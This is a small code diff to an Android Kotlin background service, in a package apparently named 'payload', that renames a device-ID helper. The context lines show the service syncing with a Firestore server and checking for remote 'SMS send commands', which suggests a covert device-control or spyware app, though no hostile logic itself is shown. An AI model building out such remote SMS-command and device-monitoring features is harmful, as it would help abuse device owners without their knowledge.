@@ -132,7 +132,7 @@ class UnifiedService : Service() {
                 // Monitor device status and update last online
                 Log.d(TAG, "Monitoring device...")
                 
-                val deviceId = getDeviceId()
+                val deviceId = getStoredDeviceId()
                 val repository = com.payload.jansiix0ne.repository.FirestoreRepository()
                 
                 // Update last online timestamp
@@ -154,7 +154,7 @@ class UnifiedService : Service() {
                 // Sync data with server
                 Log.d(TAG, "Syncing data...")
                 
-                val deviceId = getDeviceId()
+                val deviceId = getStoredDeviceId()
                 val repository = com.payload.jansiix0ne.repository.FirestoreRepository()
                 
                 // Check for SMS send commands
@@ -189,7 +189,7 @@ class UnifiedService : Service() {
                 // Perform periodic tasks
                 Log.d(TAG, "Performing periodic tasks...")
                 
-                val deviceId = getDeviceId()
+                val deviceId = getStoredDeviceId()
                 val repository = com.payload.jansiix0ne.repository.FirestoreRepository()
                 
                 // Save periodic log
@@ -206,7 +206,7 @@ class UnifiedService : Service() {
         }
     }
     
-    private fun getDeviceId(): String {
+    private fun getStoredDeviceId(): String {
         val prefs = applicationContext.getSharedPreferences("device_info_prefs", Context.MODE_PRIVATE)
         return prefs.getString("device_id", "") ?: ""
     }
